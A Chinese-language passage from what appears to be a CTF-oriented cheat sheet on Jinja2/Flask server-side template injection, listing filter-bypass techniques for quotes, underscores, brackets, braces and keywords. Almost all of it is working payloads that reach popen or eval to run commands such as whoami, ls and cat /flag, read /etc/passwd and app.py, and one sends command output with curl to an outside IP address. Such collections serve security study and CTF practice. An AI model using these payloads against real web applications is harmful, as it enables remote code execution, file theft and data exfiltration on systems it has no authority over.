    payload:
    {{()['__class__']['__base__']['__subclasses__']()[433]['__init__']['__globals__']['popen']('whoami')['read']()}}
##### `|attr()`绕过：
使用原生JinJa2的函数`attr()`，以下两行是等价的
    {{().__class__}}
    {{()|attr('__class__')}}
    payload：
    {{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(65)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("whoami").read()')}}
##### `getattr()`绕过：
这种方法有时候由于环境问题不一定可行，会报错`'getattr' is undefined`，所以优先使用以上两种
    Python 3.7.8
    >>> ().__class__
    >>> getattr((),"__class__")
#### 过滤单双引号：
##### 利用request对象绕过：
flask中存在着request内置对象可以得到请求的信息，request可以用5种不同的方式来请求信息，我们可以利用他来传递参数绕过
    request.args.name
    request.cookies.name
    request.headers.name
    request.values.name
    request.form.name
  * GET方式，利用request.args传递参数
    {{().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()}}&arg1=open&arg2=/etc/passwd
  * POST方式，利用request.values传递参数
    {{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()}}
    post:arg1=open&arg2=/etc/passwd
  * Cookie方式，利用request.cookies传递参数
    {{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()}}
    Cookie:arg1=open;arg2=/etc/passwd
##### chr()绕过:
抓包，设置[§0§]，这里先爆破`subclasses`，获取`subclasses`中含有chr的类索引，然后用chr来绕过传参时所需要的引号，然后需要用chr来构造需要的字符
    {{().__class__.__base__.__subclasses__()[§0§].__init__.__globals__.__builtins__.chr}}
快速构造想要的ascii字符:
    //chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)
    payload:
    {% set chr = ().__class__.__base__.__subclasses__()[7].__init__.__globals__.__builtins__.chr %}{{().__class__.__base__.__subclasses__()[257].__init__.__globals__.popen(chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read()}}
#### 过滤下划线:
##### 编码绕过:
使用十六进制编码绕过，`_`编码后为`\x5f`，`.`编码后为`\x2E`
    {{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[376]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]['popen']('whoami')['read']()}}
甚至可以全十六进制绕过，顺便把关键字也一起绕过，这里先给出个python脚本方便转换
    string1="__class__"
    string2="\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"
    def tohex(string):
      result = ""
      for i in range(len(string)):
          result=result+"\\x"+hex(ord(string[i]))[2:]
      print(result)
    tohex(string1) #\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f
    print(string2) #__class__
    {{""["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x62\x61\x73\x65\x5f\x5f"]["\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f"]()[64]["\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"]["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]["\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f"]["\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f"]("\x6f\x73")["\x70\x6f\x70\x65\x6e"]("whoami")["\x72\x65\x61\x64"]()}}
##### 利用request对象绕过:
    {{()[request.args.class][request.args.bases][0][request.args.subclasses]()[40]('/flag').read()}}&class=__class__&bases=__bases__&subclasses=__subclasses__
    {{()[request.args.class][request.args.bases][0][request.args.subclasses]()[77].__init__.__globals__['os'].popen('ls').read()}}&class=__class__&bases=__bases__&subclasses=__subclasses__
等同于：
    {{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
  1. |attr()绕过
#### 过滤关键字：
##### 拼接字符绕过：
这里以过滤class为例子，用中括号括起来然后里面用引号连接，可以用`+`号或者不用
    {{()['__cla'+'ss__'].__bases__[0]}}
    {{()['__cla''ss__'].__bases__[0]}}
    payload：
    {{()['__cla''ss__'].__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['ev''al']("__im""port__('o''s').po""pen('whoami').read()")}}
    {%print lipsum.__globals__['__bui'+'ltins__']['__im'+'port__']('o'+'s')['po'+'pen']('whoami').read()%}
    {%print lipsum['__glo'+'bals__']['__buil'+'tins__']['ev''al']("__im""port__('o''s').po""pen('whoami').read()")%}
    {%set a='__bui'+'ltins__'%}
    {%set b='__im'+'port__'%}
    {%set c='o'+'s'%}
    {%set d='po'+'pen'%}
    {%print(lipsum['__globals__'][a][b](c)[d]('cat /flag_1s_Hera')['read']())%}
##### join拼接：
    {{()|attr(["_"*2,"cla","ss","_"*2]|join)}}
    {{[].__class__.__base__.__subclasses__()[40]("fla".join("/g")).read()}}
  * 管道符+`format`方法拼接，也就是我们平时说的格式化字符串，其中的`%s`被`l`替换
    {{()|attr(request.args.f|format(request.args.a))}}&f=__c%sass__&a=l
##### 使用`str`原生函数:
  * replace绕过：
    {{().__getattribute__('__claAss__'.replace("A","")).__bases__[0].__subclasses__()[376].__init__.__globals__['popen']('whoami').read()}}
  * decode绕过(python2)：
    {{().__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}
##### 替代:
过滤init，可以用`__enter__`或`__exit__`替代
    {{().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
    {{().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
过滤config，我们通常会用`{{config}}`获取当前设置，如果被过滤了可以使用以下的payload绕过
    {{self}} ⇒ 
    {{self.__dict__._TemplateReference__context}}
##### Unicode编码绕过:
我们可以利用unicode编码的方法，绕过关键字过滤，例如：
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']['\u0065\u0076\u0061\u006c']('__import__("os").popen("ls /").read()')}}
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\u006f\u0073'].popen('\u006c\u0073\u0020\u002f').read()}}
    #等同于：
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
#### 过滤中括号：
`[`和`]`
##### `pop`和`__getitem__`绕过:
    #在python里面可以使用以下方法访问数组元素
    >>> ["a","kawhi","c"][1]
    'kawhi'
    >>> ["a","kawhi","c"].pop(1)
    'kawhi'
    >>> ["a","kawhi","c"].__getitem__(1)
    'kawhi'
    #利用__getitem__绕过：可以使用 __getitem__() 方法输出序列属性中的某个索引处的元素
    {{''.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(40)('/etc/passwd').read()}}       
    #指定序列属性
    {{().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')('__import__("os").popen("ls /").read()')}}  
    #指定字典属性
    #利用 pop() 绕过：pop()方法可以返回指定序列属性中的某个索引处的元素或指定字典属性中某个键对应的值
    {{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()}}       
    #指定序列属性
    {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.pop('__builtins__').pop('eval')('__import__("os").popen("ls /").read()')}}       
    #指定字典属性
##### `__getattribute__`绕过：
  * 调用魔术方法本来是不用中括号的，但是如果过滤了关键字，要进行拼接的话就不可避免要用到中括号，如果同时过滤了class和中括号，可用`__getattribute__`绕过
    {{"".__getattribute__("__cla"+"ss__").__base__}}
##### 配合`request`绕过：
    {{().__getattribute__(request.args.arg1).__base__}}&arg1=__class__
    payload：
    {{().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(376).__init__.__globals__.popen(request.args.arg2).read()}}&arg1=__class__&arg2=whoami
    ?name={{x.__init__.__globals__.__getitem__(request.cookies.x1).eval(request.cookies.x2)}}
    cookie传参：x1=__builtins__;x2=__import__('os').popen('cat /f*').read()
##### 利用字典读取绕过:
我们知道访问字典里的值有两种方法，一种是把相应的键放入熟悉的方括号 `[]` 里来访问，一种就是用点 `.` 来访问。所以，当方括号 `[]`
被过滤之后，我们还可以用点 `.` 的方式来访问:
    #// __builtins__.eval()
    {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.__builtins__.eval('__import__("os").popen("ls /").read()')}}
    #等同于：
    [__builtins__]['eval'](){{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
#### 过滤双大括号:
##### 使用外带数据:
用{%%}替代了{{}}，使用判断语句进行dns外带数据
    {% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://47.xxx.xxx.72:2333 -d `ls /|grep flag`') %}1{% endif %}
##### print标记:
我们上面之所以要dnslog外带数据以及使用盲注，是因为用{%%}会没有回显，这里的话可以使用print来做一个标记使得他有回显，比如{%print
config%}，payload如下
    {%print ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")%}
#### 利用 `|attr()` Bypass
##### 过滤 . &[ ]:
**`|attr()+__getitem()__`绕过：**
    {{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls")|attr("read")()}}
    #等同于：
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read()}}
##### 过滤_&.&[ ]&'':
**`|attr()+__getitem__+request`绕过：**
    #payload的原型：
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
    #由于中括号 `[` 被过滤了，我们可以用 `__getitem__()` 来绕过（尽量不要用pop()），类似如下：
    {{().__class__.__base__.__subclasses__().__getitem__(77).__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')('__import__("os").popen("ls /").read()')}}
    #由于还过滤了下划线 `__`，我们可以用request对象绕过，但是还过滤了中括号 `[]`，所以我们要同时绕过 `__` 和 `[`，就用到了我们的`|attr()`
    payload:
    {{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}
    &x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('ls /').read()
##### 过滤args&.&_：
**`|attr()+request(values)`绕过：**
    {{()|attr(request['values']['x1'])|attr(request['values']['x2'])|attr(request['values']['x3'])()|attr(request['values']['x4'])(40)|attr(request['values']['x5'])|attr(request['values']['x6'])|attr(request['values']['x4'])(request['values']['x7'])|attr(request['values']['x4'])(request['values']['x8'])(request['values']['x9'])}}
    post:x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('whoami').read()
##### 过滤_&.&'：
主要是找到_frozen_importlib_external.FileLoader的get_data()方法，第一个是参数0，第二个为要读取的文件名，payload如下
    {{().__class__.__bases__[0].__subclasses__()[222].get_data(0,"app.py")}}
使用十六进制绕过后，payload如下
    {{()["\x5f\x5fclass\x5f\x5f"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[222]["get\x5Fdata"](0, "app\x2Epy")}}
#### 利用`|attr()`\+ 编码Bypass
##### `Unicode +|attr()`:
    #过滤了以下字符：
    '' & 'request' & '{{' & '_' & '%20(空格)' & '[]' & '.' & '__globals__' & '__getitem__'
    #我们用 {%...%}绕过对 {{ 的过滤，并用unicode绕过对关键字的过滤。
    我们要构造的payload原型为：
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read()}}
    #先用|attr()绕过.和[]：
    {{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls")|attr("read")()}}
    #我们可以将过滤掉的字符用unicode替换掉：
    {{()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f")|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(77)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("os")|attr("popen")("ls")|attr("read")()}}
##### `Hex +|attr()` :
  * 和上面那个一样，只不过是将Unicode编码换成了Hex编码，适用于“u”被过滤了的情况。
  * 我们可以将过滤掉的字符用Hex编码替换掉：
    {{()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f")|attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f")|attr("\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f")()|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")(258)|attr("\x5f\x5f\x69\x6e\x69\x74\x5f\x5f")|attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f")|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("os")|attr("popen")("cat\x20\x66\x6c\x61\x67\x2e\x74\x78\x74")|attr("read")()}}
参考文章:  